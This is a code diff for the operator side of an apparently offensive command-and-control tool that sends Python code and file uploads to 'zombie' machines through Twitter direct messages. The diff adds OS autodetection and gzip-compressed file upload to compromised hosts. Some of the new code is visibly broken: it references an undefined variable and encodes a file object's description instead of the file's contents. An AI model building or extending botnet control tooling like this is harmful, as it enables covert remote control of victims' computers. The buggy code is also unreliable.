@@ -5,6 +5,8 @@ import _thread
 import time
 import subprocess
 import os
+import gzip
+
 
 from tweepy import OAuthHandler
 from tc2lib import *
@@ -14,14 +16,17 @@ from subprocess import PIPE as pipe
 global username, posts, pause, agent_user
 
 path = os.path.dirname(os.path.abspath(__file__))
-pcos = input("Enter your operating system [win/lin]: ").lower()
-while not (pcos == "win" or pcos == "lin"):
-        input("Enter your operating system [win/lin]: ").lower()
+if '\\' in list(path):
+        pcos = "win"
+elif '/' in list(path):
+        pcos = "lin"
 
 if pcos == "win":
         ignoretxt = path+"\\ignore.txt"
+        slash = "\\"
 elif pcos == "lin":
         ignoretxt = path+"/ignore.txt"
+        slash = "/"
 else: print("Something has gone horribly wrong...")
 
 consumer_key, consumer_secret, access_token, access_secret, username, agent_user = get_keys()
@@ -245,20 +250,25 @@ def user_menu():
                                         msg = format_msg("server",zombie,command,False,False)
                                         dm = api.send_direct_message(agent_user,text=msg)
                                         add_ignore(dm.id)
-                                        print("Send python code to [%s]" % zombie)
+                                        print("[+] Sent python code to [%s]" % zombie)
                                 else: print("[!] Please select zombie first")
                         elif com == "upload":
-                                try:
-                                        filename = parts[1]
-                                        filedata = open(filename,"r").read()
-                                        cmdmsg = filename+"#data#"+filedata
-                                        cmdmsg = base64.b64encode(cmsmsg.encode()).decode()
-                                        command = {"type":"upload","cmd":cmdmsg,"get_result":True,"background":False}
-                                        msg = format_msg("server",zombie,command,False,False)
-                                        add_ignore(api.send_direct_message(msg).id)
-                                        print("Sent command")
-                                except:
-                                        print("[!] Requires filename as argument")
+                                if not zombie == "":
+                                        try:
+                                                filename = parts[1]
+                                                with open(filename,"r") as in_file:
+                                                        with gzip.open((filename+".gz"),"wb") as out_file:
+                                                                out_file.write(in_file.read().encode('utf-8'))
+                                                filedata = str(open((filename+".gz"),"r"))
+                                                cmdcode = filename+".gz#data#"+filedata
+                                                cmdcode = base64.b64encode(cmdmsg.encode('utf-8')).decode()
+                                                command = {"type":"upload","cmd":cmdcode,"get_result":True,"background":False}
+                                                msg = format_msg("server",zombie,command,False,False)
+                                                add_ignore(api.send_direct_message(agent_user,text=msg).id)
+                                                print("[+] Sent file")
+                                        except Exception as e:
+                                                print("[Error]: "+str(e))
+                                else: print("[!] Please select zombie first")
                         else: print(error_noCmd)
                 else: print(error_noCmd)
 
